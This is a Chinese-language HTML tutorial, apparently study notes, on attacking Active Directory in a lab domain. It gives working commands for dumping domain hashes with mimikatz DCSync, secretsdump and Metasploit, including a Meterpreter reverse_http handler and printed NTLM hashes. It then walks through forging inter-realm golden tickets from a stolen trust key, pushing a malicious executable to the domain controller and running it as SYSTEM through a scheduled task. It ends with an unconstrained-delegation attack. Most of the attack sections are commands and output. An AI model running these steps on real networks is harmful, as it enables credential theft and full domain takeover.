+<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><h3 id="1、可以读取所有用户的hash"><a href="#1、可以读取所有用户的hash" class="headerlink" title="1、可以读取所有用户的hash"></a>1、可以读取所有用户的hash</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz lsadump::dcsync /domain:hack.com /all /csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="2、也可以读取单个用户的hash"><a href="#2、也可以读取单个用户的hash" class="headerlink" title="2、也可以读取单个用户的hash"></a>2、也可以读取单个用户的hash</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz lsadump::dcsync /domain:hack.com /user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h2><p>1、上传工具到目标机器，使用命令先导出ntds文件，然后直接读取</p>
+<pre class="line-numbers language-none"><code class="language-none">QuarksPwDump.exe --dump-hash-domain --ntds-file ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="impacket-2"><a href="#impacket-2" class="headerlink" title="impacket"></a>impacket</h2><p><strong>使用secretsdump直接读取</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds
+
+eg: 
+secretsdump.exe hack/administrator:123456kl;'@192.168.70.16 -outputfile 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Invoke-DCSync"><a href="#Invoke-DCSync" class="headerlink" title="Invoke-DCSync"></a>Invoke-DCSync</h2><p>github下载：<a target="_blank" rel="noopener" href="https://github.com/Al1ex/Invoke-DCSync">https://github.com/Al1ex/Invoke-DCSync</a></p>
+<p>Invoke-DCSyncs是powershell脚本可以在线读取内存中的用户hash</p>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-DCSync.ps1
+Invoke-DCSync -PWDumpFormat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h1 id="MSF读取ntds-dit文件"><a href="#MSF读取ntds-dit文件" class="headerlink" title="MSF读取ntds.dit文件"></a>MSF读取ntds.dit文件</h1><h2 id="离线读取"><a href="#离线读取" class="headerlink" title="离线读取"></a>离线读取</h2><p>离线读取使用<strong>msf</strong>读取ntds文件，前提是msf必须和域控相同，我们可以使用代理技术,将msf代理到内网,然后<br>使用msf导出ntds文件</p>
+<h3 id="1、使用导出模块进行导出"><a href="#1、使用导出模块进行导出" class="headerlink" title="1、使用导出模块进行导出"></a>1、使用导出模块进行导出</h3><pre class="line-numbers language-none"><code class="language-none">msfconsole
+use auxiliary/admin/smb/psexec_ntdsgrab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="2、填写相关的选项，主要有IP，域，-用户名和密码"><a href="#2、填写相关的选项，主要有IP，域，-用户名和密码" class="headerlink" title="2、填写相关的选项，主要有IP，域， 用户名和密码"></a>2、填写相关的选项，主要有IP，域， 用户名和密码</h3><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.70.16
+set SMBDomain hack.com
+set smbuser administrator
+set smbpass "123456kl;'"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3、运行之后ntds和system文件会被保存到-x2F-root-x2F-msf4-x2F-loot下"><a href="#3、运行之后ntds和system文件会被保存到-x2F-root-x2F-msf4-x2F-loot下" class="headerlink" title="3、运行之后ntds和system文件会被保存到/root/.msf4/loot下"></a>3、运行之后ntds和system文件会被保存到/root/.msf4/loot下</h3><pre class="line-numbers language-none"><code class="language-none">Running module against 192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="在线读取"><a href="#在线读取" class="headerlink" title="在线读取"></a>在线读取</h2><h3 id="1、使用cs或者其他的方式先上线的msf中使用派生会话的方式"><a href="#1、使用cs或者其他的方式先上线的msf中使用派生会话的方式" class="headerlink" title="1、使用cs或者其他的方式先上线的msf中使用派生会话的方式"></a>1、使用cs或者其他的方式先上线的msf中使用<strong>派生</strong>会话的方式</h3><pre class="line-numbers language-none"><code class="language-none">use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set lhost 192.168.70.3
+set lport 6666
+exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-拿到shell之后执行hashdump"><a href="#2-拿到shell之后执行hashdump" class="headerlink" title="2.拿到shell之后执行hashdump"></a>2.拿到shell之后执行<code>hashdump</code></h3><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果不能执行就<strong>迁移</strong>进程到64位中</p>
+<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getpid
+meterpreter &gt; ps
+meterpreter &gt; migrate 532
+meterpreter &gt; hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f4766727c46a2891f71c237b518727d5:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d5adb4aa3a471374f46ba24ba01cb08b:::
+DC:1001:aad3b435b51404eeaad3b435b51404ee:1f0e20e21088dae3bfcfcf6d5f8bd98e:::
+jack:1108:aad3b435b51404eeaad3b435b51404ee:e45a314c664d40a227f9540121d1a29d:::
+lihua:1113:aad3b435b51404eeaad3b435b51404ee:68faaeedea6e05549453d18b03c6a8d2:::
+kkk:1118:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::
+DC$:1002:aad3b435b51404eeaad3b435b51404ee:5717ea7a3688384a618e60400cfdb35c:::
+PC-MB$:1117:aad3b435b51404eeaad3b435b51404ee:40e3866bd78eb3bcfc9b137e111eee06:::
+PC-GYX$:1119:aad3b435b51404eeaad3b435b51404ee:009d1c712c2ec3f9b4344dce33b40c73:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3、或者使用下面的脚本，也可以读取域内的hash"><a href="#3、或者使用下面的脚本，也可以读取域内的hash" class="headerlink" title="3、或者使用下面的脚本，也可以读取域内的hash"></a>3、或者使用下面的脚本，也可以读取域内的hash</h3><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background
+msf6 exploit(multi/handler) &gt; sessions 
+msf6 exploit(multi/handler) &gt; use post/windows/gather/smart_hashdump
+msf6 post(windows/gather/smart_hashdump) &gt; show options
+msf6 post(windows/gather/smart_hashdump) &gt; set session 1
+msf6 post(windows/gather/smart_hashdump) &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="跨域攻击介绍"><a href="#跨域攻击介绍" class="headerlink" title="跨域攻击介绍"></a>跨域攻击介绍</h1><h2 id="内网中的域林"><a href="#内网中的域林" class="headerlink" title="内网中的域林"></a>内网中的域林</h2><p>很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门,从逻辑上以主域和子<br>域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不同的区域。</p>
+<p><img src="assets/image-20230412200223351.png" alt="image-20230412200223351"></p>
+<h2 id="跨域攻击方法"><a href="#跨域攻击方法" class="headerlink" title="跨域攻击方法"></a>跨域攻击方法</h2><ol>
+<li>常规渗透方法(利用web漏洞)</li>
+<li>哈希传递票据攻击</li>
+<li>利用域信任关系</li>
+</ol>
+<p><img src="assets/image-20230412201336539.png" alt="image-20230412201336539"></p>
+<h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h2><p>建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的<strong>管理和维<br>护</strong>，域信任作为域中的一种机制，允许另一个域的用户在通过身份验证后访问本域中的资源。同时，域信任利用<br>DNS服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个域， 也就不存在通过域信<br>任关系进行跨域资源共享了</p>
+<h2 id="域信任关系分类"><a href="#域信任关系分类" class="headerlink" title="域信任关系分类"></a>域信任关系分类</h2><p>域信任关系分为<strong>单向信任和双向信任</strong></p>
+<p>单向信任:是指在两个域之间创建单向的信任路径，即在一一个方向上是信任流，在另一个方向上是访问流，受信<br>任域内的用户(或者计算机)可以访问信任域内的资源，但信任域内的用户无法访问受信任域内的资源。也就是<br>说，A域信任B域，那么B域内受信任的主体可以访问A域内信任B域的资源。</p>
+<p>双向信任:是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。这意味<br>着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有信任关系都是双向可传递的。在创建子<br>域时，会在新的父域和子域之间自动创建双向可传递信任关系，从下级域发出的身份验证请求可以通关其父域向<br>上流向信任域</p>
+<p>域信任关系也可以分为<strong>内部信任和外部信任</strong></p>
+<p>内部信任:在默认情况下,用活动目录安装向导将新域添加到域树或林根域中，会自动创建双向可传递信任。在现<br>有林中创建域树时，将建立新的树根信任，当前域树中的两个或多个域之间的信任关系被称为内部信任。这种信<br>任关系是可传递的。例如，有三个子域BA,CA,DA,BA域信任CA域，CA域信任DA域，则BA域也信任DA域。</p>
+<p>外部信任是指两个不同林中的域的信任关系。<strong>外部信任是不可传递的，而且是单向的。</strong></p>
+<p>只有domain admins组中的用户可以管理域信任关系</p>
+<p><img src="assets/image-20230412202011889.png" alt="image-20230412202011889"></p>
+<h1 id="搭建和查看域信任关系"><a href="#搭建和查看域信任关系" class="headerlink" title="搭建和查看域信任关系"></a>搭建和查看域信任关系</h1><h2 id="搭建域树-内部信任"><a href="#搭建域树-内部信任" class="headerlink" title="搭建域树(内部信任)"></a>搭建域树(内部信任)</h2><p><strong>如果是复制的虚拟机请运行</strong><code>C:\Windows\System32\sysprep\sysprep.exe</code>重新获取SID</p>
+<h3 id="1、修改计算机名和修改IP地址，DNS指向父域"><a href="#1、修改计算机名和修改IP地址，DNS指向父域" class="headerlink" title="1、修改计算机名和修改IP地址，DNS指向父域"></a>1、修改计算机名和修改IP地址，DNS指向父域</h3><pre class="line-numbers language-none"><code class="language-none">计算机名称：win2012-dc2
+ip:192.168.70.17
+dns:192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2、安装AD域服务"><a href="#2、安装AD域服务" class="headerlink" title="2、安装AD域服务"></a>2、安装AD域服务</h3><p><img src="assets/image-20230412202740518.png" alt="image-20230412202740518"></p>
+<h3 id="3、升级为域控"><a href="#3、升级为域控" class="headerlink" title="3、升级为域控"></a>3、升级为域控</h3><p><img src="assets/image-20230413151917330.png" alt="image-20230413151917330"></p>
+<h3 id="4、添加到现有林"><a href="#4、添加到现有林" class="headerlink" title="4、添加到现有林"></a>4、添加到现有林</h3><p><img src="assets/image-20230413151950891.png" alt="image-20230413151950891"></p>
+<pre class="line-numbers language-none"><code class="language-none">选择域类型：子域
+父域：hack.com
+新域：abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="5、提供父域的账号密码"><a href="#5、提供父域的账号密码" class="headerlink" title="5、提供父域的账号密码"></a>5、提供父域的账号密码</h3><p><img src="assets/image-20230413152542608.png" alt="image-20230413152542608"></p>
+<pre class="line-numbers language-none"><code class="language-none">提供凭证:
+账号：hack\administrator
+密码：123456kl;'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="6、正常安装直到结束"><a href="#6、正常安装直到结束" class="headerlink" title="6、正常安装直到结束"></a>6、正常安装直到结束</h3><h2 id="搭建域森林-外部信任"><a href="#搭建域森林-外部信任" class="headerlink" title="搭建域森林(外部信任)"></a>搭建域森林(外部信任)</h2><h3 id="1、修改计算机名和修改IP地址，DNS指向根域"><a href="#1、修改计算机名和修改IP地址，DNS指向根域" class="headerlink" title="1、修改计算机名和修改IP地址，DNS指向根域"></a>1、修改计算机名和修改IP地址，DNS指向根域</h3><pre class="line-numbers language-none"><code class="language-none">计算机名称：win2012-dc3
+ip:192.168.70.18
+dns:192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2、安装AD域服务-1"><a href="#2、安装AD域服务-1" class="headerlink" title="2、安装AD域服务"></a>2、安装AD域服务</h3><h3 id="3、升级为域控-1"><a href="#3、升级为域控-1" class="headerlink" title="3、升级为域控"></a>3、升级为域控</h3><h3 id="4、添加到现有林-1"><a href="#4、添加到现有林-1" class="headerlink" title="4、添加到现有林"></a>4、添加到现有林</h3><p><img src="assets/image-20230413160049365.png" alt="image-20230413160049365"></p>
+<pre class="line-numbers language-none"><code class="language-none">选择域类型：树域
+林名称：hack.com
+新域名：wanli.com
+
+提供凭证:
+账号：hack\administrator
+密码：123456kl;'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>5、正常安全即可</p>
+<h2 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h2><p>在域中，<strong>Enterprise Admins组</strong>(出现在林中的<strong>根域</strong>中)的成员具有对目录林中所有域的完全控制权限。在默认情况下，该组包含林中所有域控制器上具有<strong>Administrators</strong>权限的成员</p>
+<h3 id="查看当前域中计算机的权限"><a href="#查看当前域中计算机的权限" class="headerlink" title="查看当前域中计算机的权限"></a>查看当前域中计算机的权限</h3><pre class="line-numbers language-none"><code class="language-none">whoami /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="使用lg工具获取域的相关信息"><a href="#使用lg工具获取域的相关信息" class="headerlink" title="使用lg工具获取域的相关信息"></a>使用lg工具获取域的相关信息</h3><p><strong>下载地址：<a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/lg/index.htm">http://www.joeware.net/freetools/tools/lg/index.htm</a></strong></p>
+<h4 id="查看域信任关系"><a href="#查看域信任关系" class="headerlink" title="查看域信任关系"></a>查看域信任关系</h4><pre class="line-numbers language-none"><code class="language-none">nltest /domaun_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="assets/image-20230413193906340.png" alt="image-20230413193906340"></p>
+<h4 id="获取当前域中的用户组"><a href="#获取当前域中的用户组" class="headerlink" title="获取当前域中的用户组"></a>获取当前域中的用户组</h4><pre class="line-numbers language-none"><code class="language-none">LG.exe 域名\.
+
+eg:
+LG.exe abc\.
+LG.exe hack\.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="assets/image-20230413205440254.png" alt="image-20230413205440254"></p>
+<h4 id="获取远程机器的本地用户组"><a href="#获取远程机器的本地用户组" class="headerlink" title="获取远程机器的本地用户组"></a>获取远程机器的本地用户组</h4><pre class="line-numbers language-none"><code class="language-none">LG.exe \\计算机名 -lu
+
+eg:
+LG.exe \\dc -lu
+LG.exe \\win2012-dc2 -lu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="assets/image-20230413205654909.png" alt="image-20230413205654909"></p>
+<p><img src="assets/image-20230413205934261.png" alt="image-20230413205934261"></p>
+<h4 id="获取远程系统中的用户SID"><a href="#获取远程系统中的用户SID" class="headerlink" title="获取远程系统中的用户SID"></a>获取远程系统中的用户SID</h4><pre class="line-numbers language-none"><code class="language-none">LG.exe \\计算机名 -lu -sidsout
+
+eg:
+LG.exe \\dc -lu -sidsout
+LG.exe \\win2012-pc2 -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="assets/image-20230413210317674.png" alt="image-20230413210317674"></p>
+<p><img src="assets/image-20230413210359274.png" alt="image-20230413210359274"></p>
+<h1 id="利用域信任密钥获取目标域"><a href="#利用域信任密钥获取目标域" class="headerlink" title="利用域信任密钥获取目标域"></a>利用域信任密钥获取目标域</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><table>
+<thead>
+<tr>
+<th>IP地址</th>
+<th>所属域</th>
+<th>域中地位</th>
+<th>机器名</th>
+<th>当前登录用户</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>192.168.70.16</td>
+<td>hack.com</td>
+<td>根域的域控</td>
+<td>dc</td>
+<td>hack\administrator</td>
+</tr>
+<tr>
+<td>192.1 68.70.17</td>
+<td>abc.hack.com</td>
+<td>子域的域控</td>
+<td>win2012-DC2</td>
+<td>abc\administrator</td>
+</tr>
+<tr>
+<td>192.168.70.19</td>
+<td>abc.hack.com</td>
+<td>子域中的机器</td>
+<td>pc-sz</td>
+<td>abc\liwei</td>
+</tr>
+</tbody></table>
+<p><strong>当前已经控制abc.hack.com域，其中包括win2012-DC2 机器 和 pc-sz机器</strong></p>
+<p><img src="assets/image-20230413210930475.png" alt="image-20230413210930475"></p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="当前无法访问DC-HACK-COM"><a href="#当前无法访问DC-HACK-COM" class="headerlink" title="当前无法访问DC.HACK.COM"></a><strong>当前无法访问DC.HACK.COM</strong></h3><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="查看域信任关系-1"><a href="#查看域信任关系-1" class="headerlink" title="查看域信任关系"></a><strong>查看域信任关系</strong></h3><pre class="line-numbers language-none"><code class="language-none">nltest /domaun_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="使用mimikatz获取"><a href="#使用mimikatz获取" class="headerlink" title="使用mimikatz获取"></a>使用mimikatz获取</h3><p><strong>当前域的SID 、父域的SID 、子域域管的NTLM、信任密钥</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "privilege::debug" "lsadump::lsa /patch /user:HACK$" "lsadump::trust /patch" exit
+
+mimikatz lsadump::trust /patch
+mimikatz lsadump::lsa /patch /user:HACK$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="assets/image-20230414144204852.png" alt="image-20230414144204852"></p>
+<pre class="line-numbers language-none"><code class="language-none">当前域的SID:
+Current domain: ABC.HACK.COM (ABC / S-1-5-21-3680861422-3487063359-3354113185)
+
+父域的SID:
+Domain: HACK.COM (HACK / S-1-5-21-3769107300-1842393386-2897162586)
+
+信任密钥:
+[  In ] ABC.HACK.COM -&gt; HACK.COM
+* rc4_hmac_nt       2888e20ad4fc91ca391f9f0e0cfe37e6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="在普通的域内用户中创建创建高权限票据"><a href="#在普通的域内用户中创建创建高权限票据" class="headerlink" title="在普通的域内用户中创建创建高权限票据"></a>在普通的域内用户中创建创建高权限票据</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "kerberos::golden /domain:子域 /sid:子域SID /sids:父域-519 /rc4:信任密钥 /user:任意用户 /service:krbtgt /target:父域 /ticket:subdc_administrator.kirbi" exit
+
+eg:
+mimikatz kerberos::golden /domain:abc.hack.com /sid:S-1-5-21-3680861422-3487063359-3354113185 /sids:S-1-5-21-3769107300-1842393386-2897162586-519 /rc4:2888e20ad4fc91ca391f9f0e0cfe37e6 /user:administrator /service:krbtgt /target:hack.com /ticket:administrator.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>生成administrator.kirbi票据</strong></p>
+<p><img src="assets/image-20230414150155523.png" alt="image-20230414150155523"></p>
+<h3 id="上传asktgs-exe和kirbikator-exe工具"><a href="#上传asktgs-exe和kirbikator-exe工具" class="headerlink" title="上传asktgs.exe和kirbikator.exe工具"></a>上传asktgs.exe和kirbikator.exe工具</h3><p>github下载：<a target="_blank" rel="noopener" href="https://github.com/NotScortator/asktgs_compiled">https://github.com/NotScortator/asktgs_compiled</a></p>
+<p><strong>asktgs.exe伪造票据， kirbikator.exe注入票据</strong></p>
+<h3 id="创建CIFS服务的票据进行复制文件的操作"><a href="#创建CIFS服务的票据进行复制文件的操作" class="headerlink" title="创建CIFS服务的票据进行复制文件的操作"></a>创建CIFS服务的票据进行复制文件的操作</h3><pre class="line-numbers language-none"><code class="language-none">shell asktgs.exe administrator.kirbi CIFS/DC.hack.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>生成CIFS.DC.hack.com.kirbi票据</strong></p>
+<p><strong>注意：票据假的就是假的，只能用一次，用完就会失效，及时清理票据<code>klist purge</code></strong></p>
+<h3 id="将票据注入内存"><a href="#将票据注入内存" class="headerlink" title="将票据注入内存"></a>将票据注入内存</h3><pre class="line-numbers language-none"><code class="language-none">shell kirbikator.exe lsa CIFS.DC.hack.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="访问域控"><a href="#访问域控" class="headerlink" title="访问域控"></a>访问域控</h3><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="复制恶意文件"><a href="#复制恶意文件" class="headerlink" title="复制恶意文件"></a>复制恶意文件</h3><p><strong>如果复制失败，请注入host服务票据。</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">shell copy 1.exe \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="伪造host服务，进行创建计划任务"><a href="#伪造host服务，进行创建计划任务" class="headerlink" title="伪造host服务，进行创建计划任务"></a>伪造host服务，进行创建计划任务</h3><pre class="line-numbers language-none"><code class="language-none">shell asktgs.exe administrator.kirbi host/DC.hack.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>生成host.DC.hack.com.kirbi票据</strong></p>
+<h3 id="将票据注入内存-1"><a href="#将票据注入内存-1" class="headerlink" title="将票据注入内存"></a>将票据注入内存</h3><pre class="line-numbers language-none"><code class="language-none">shell kirbikator.exe lsa host.DC.hack.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h3><pre class="line-numbers language-none"><code class="language-none">复制恶意文件
+shell copy 1.exe \\dc.hack.com\c$
+
+创建计划任务
+shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\1.exe /ru system /f
+
+执行计划任务
+shell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="域内委派根据概述"><a href="#域内委派根据概述" class="headerlink" title="域内委派根据概述"></a>域内委派根据概述</h1><h2 id="委派是什么"><a href="#委派是什么" class="headerlink" title="委派是什么"></a>委派是什么</h2><p><strong>我们先看一下kerberos协议</strong></p>
+<p><img src="assets/image-20230414174833287.png" alt="image-20230414174833287"></p>
+<p><strong>我们要去买票，但是自己又不想去，我们就可以委托中间商，给我们买票，这个就是委派</strong></p>
+<p><img src="assets/image-20230414175110546.png" alt="image-20230414175110546"></p>
+<p><strong>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。</strong></p>
+<p><strong>委派是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种:</strong></p>
+<ol>
+<li>非约束性委派</li>
+<li>约束性委派;</li>
+<li>基于资源的约束性委派</li>
+</ol>
+<h2 id="委派攻击的工作场景"><a href="#委派攻击的工作场景" class="headerlink" title="委派攻击的工作场景"></a>委派攻击的工作场景</h2><p><strong>一个域内用户访问WEB服务，但是一些资源在文件服务上，这个时候就需要委派</strong></p>
+<p><img src="assets/image-20230414175657946.png" alt="image-20230414175657946"></p>
+<h2 id="怎么设置委派"><a href="#怎么设置委派" class="headerlink" title="怎么设置委派"></a>怎么设置委派</h2><p><strong>在域内只有 主机账号 和 服务账号 才有委派属性</strong></p>
+<p><strong>主机账号:活动目录中的computers组内的计算机，也被称为机器账号。</strong></p>
+<p><img src="assets/image-20230414180359456.png" alt="image-20230414180359456"></p>
+<p><strong>服务账号:域内用户的一种类型，是服务器运行服务时所用的账号,将服务运行起来加入域内，比如: SQLServer,MYSQL等;域用户通过注册SPN也能成为服务账号。</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">net user test Admin@123 /add /domain 创建一个普通用户
+setspn -U -A priv/test test 注册为服务账号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="assets/image-20230414181328037.png" alt="image-20230414181328037"></p>
+<p><strong>开启委派如图</strong></p>
+<p><img src="assets/image-20230414181455032.png" alt="image-20230414181455032"></p>
+<h1 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h1><h2 id="非约束委派使用场景"><a href="#非约束委派使用场景" class="headerlink" title="非约束委派使用场景"></a>非约束委派使用场景</h2><p><strong>从使用的角度:用户张三访问一台机器A，于是向DC发起认证，DC会检查A的机器账号的属性，如果是非约束委<br>派的话，会把用户的TGT放在ST票据中并-起发送给A,这样A在验证ST票据的同时也获取到了用户的TGT,并把<br>TGT储存在自己的Isass进程中以备下次重用，从而A就可以使用这个TGT,来模拟这个张三访问任何服务。</strong></p>
+<p><img src="assets/image-20230414182004604.png" alt="image-20230414182004604"></p>
+<p><strong>从攻击角度来说:如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以<br>得到管理员的TGT,从而模拟管理员访问任意服务，相当于拿下了整个域环境，或者结合打印机漏洞让域管用户强<br>制回连以缓存TGT</strong></p>
+<p><strong>一个域内用户访问WEB服务，但是一些资源在文件服务上， 这个时候就需要委派，需要web系统代表用户A去访<br>问文件服务的资源</strong></p>
+<p><img src="assets/image-20230414175657946.png" alt="image-20230414175657946"></p>
+<h2 id="非约束委派的漏洞"><a href="#非约束委派的漏洞" class="headerlink" title="非约束委派的漏洞"></a>非约束委派的漏洞</h2><p><img src="assets/image-20230414194133477-16814725001861.png" alt="image-20230414194133477"></p>
+<p><strong>如果是域管访问web系统，我们就可以通过web系统伪造域管的身份登录域控</strong></p>
+<h2 id="利用非约束委派域控主动访问控制域"><a href="#利用非约束委派域控主动访问控制域" class="headerlink" title="利用非约束委派域控主动访问控制域"></a>利用非约束委派域控主动访问控制域</h2><p><strong>实验环境如下:</strong></p>
+<table>
+<thead>
+<tr>
+<th>机器位置</th>
+<th>机器IP</th>
+<th>机器名</th>
+<th>机器登录用户</th>
+<th>所属域</th>
+<th>委派配置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域内域控制器</td>
+<td>192.168.70.16</td>
+<td>DC</td>
+<td>hack\administrator</td>
+<td>hack.com</td>
+<td>域控</td>
+</tr>
+<tr>
+<td>域内机器</td>
+<td>192.168.70.14</td>
+<td>PC-MB</td>
+<td>hack\lihua</td>
+<td>hack.com</td>
+<td>配置了非约束委派</td>
+</tr>
+</tbody></table>
+<p><strong>实验前提:控制了域内的一台机器pc-web,并且该机器的服务账号配置了非约束委派，如下:</strong></p>
+<h3 id="1、使用Adfind查询"><a href="#1、使用Adfind查询" class="headerlink" title="1、使用Adfind查询"></a>1、使用Adfind查询</h3><h4 id="域内非约束委派机器账号"><a href="#域内非约束委派机器账号" class="headerlink" title="域内非约束委派机器账号"></a>域内非约束委派机器账号</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a></p>
+<pre class="line-numbers language-none"><code class="language-none">AdFind.exe -b "DC=hack,DC=com" -f "(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="assets/image-20230415190918597.png" alt="image-20230415190918597"></p>
+<h4 id="查询具有委派的服务账号"><a href="#查询具有委派的服务账号" class="headerlink" title="查询具有委派的服务账号"></a>查询具有委派的服务账号</h4><pre class="line-numbers language-none"><code class="language-none">AdFind.exe -b "DC=hack,DC=com" -f "(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="2、我们先去访问域控，是不能访问的"><a href="#2、我们先去访问域控，是不能访问的" class="headerlink" title="2、我们先去访问域控，是不能访问的"></a>2、我们先去访问域控，是不能访问的</h3><pre class="line-numbers language-none"><code class="language-none">dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3、这个时候如果域管访问了pc-web机器"><a href="#3、这个时候如果域管访问了pc-web机器" class="headerlink" title="3、这个时候如果域管访问了pc-web机器"></a>3、这个时候如果域管访问了pc-web机器</h3><p><strong>我们的内存中就会有域管的TGT,就可以访问任意机器了，在与域控上执行访问PC-MB(在域控上执行)</strong></p>
